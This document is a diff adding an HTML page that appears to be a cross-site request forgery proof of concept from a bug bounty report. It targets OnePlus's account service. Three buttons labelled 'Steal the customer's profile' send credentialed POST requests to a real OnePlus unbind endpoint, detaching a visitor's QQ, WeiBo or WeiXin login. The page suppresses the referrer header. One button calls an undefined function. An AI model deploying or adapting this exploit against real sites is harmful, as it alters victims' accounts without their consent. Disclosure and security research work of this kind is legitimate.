@@ -1,0 +1,87 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta name="referrer" content="never">
+<script src=../jquery-3.4.1.min.js></script>
+</head>
+<title>steal the customer's informations</title>
+<body>
+</br>
+</br>
+<div>
+click the button to unbind the QQ account
+<button id="stealCards" onclick="unbindQQ()">Steal the customer's profile</button>
+</div>
+<div>
+click the button to unbind the WeiBo account
+<button id="stealCards" onclick="stealprofile()">Steal the customer's profile</button>
+</div>
+<div>
+click the button to unbind the WeiXin account
+<button id="stealCards" onclick="unbindWeiXin()">Steal the customer's profile</button>
+</div>
+</br>
+</br>
+</br>
+</div>
+
+<script>
+function unbindQQ(){
+	var xhr = new XMLHttpRequest();
+        xhr.open("POST", "https://account.oneplus.com/cn/unbind/user", true);
+        xhr.setRequestHeader("Accept", "*/*");
+        xhr.setRequestHeader("Accept-Language", "zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3");
+        xhr.setRequestHeader("Content-Type", "application/json; charset=utf-8");
+        xhr.withCredentials = true;
+        xhr.send(JSON.stringify({"unionType":2}));
+ 	xhr.onreadystatechange = function(){
+	    //若响应完成且请求成功
+	    if(xhr.readyState === 4 && xhr.status === 200){
+          console.log(xhr.getAllResponseHeaders());
+          console.log("Success");
+	    }
+	}
+}
+
+
+function unbindWeiBo(){
+	var xhr = new XMLHttpRequest();
+        xhr.open("POST", "https://account.oneplus.com/cn/unbind/user", true);
+        xhr.setRequestHeader("Accept", "*/*");
+        xhr.setRequestHeader("Accept-Language", "zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3");
+        xhr.setRequestHeader("Content-Type", "application/json; charset=utf-8");
+        xhr.withCredentials = true;
+        xhr.send(JSON.stringify({"unionType":2}));
+ 	xhr.onreadystatechange = function(){
+	    //若响应完成且请求成功
+	    if(xhr.readyState === 4 && xhr.status === 200){
+          console.log(xhr.getAllResponseHeaders());
+          console.log("Success");
+	    }
+	}
+}
+
+
+function unbindWeiXin(){
+	var xhr = new XMLHttpRequest();
+        xhr.open("POST", "https://account.oneplus.com/cn/unbind/user", true);
+        xhr.setRequestHeader("Accept", "*/*");
+        xhr.setRequestHeader("Accept-Language", "zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3");
+        xhr.setRequestHeader("Content-Type", "application/json; charset=utf-8");
+        xhr.withCredentials = true;
+        xhr.send(JSON.stringify({"unionType":4}));
+ 	xhr.onreadystatechange = function(){
+	    //若响应完成且请求成功
+	    if(xhr.readyState === 4 && xhr.status === 200){
+          console.log(xhr.getAllResponseHeaders());
+          console.log("Success");
+	    }
+	}
+}
+	
+	
+</script>
+  
+<a href="https://hackerone.com/johnstone">hacker1 johnstone</a>
+</body>
+</html>
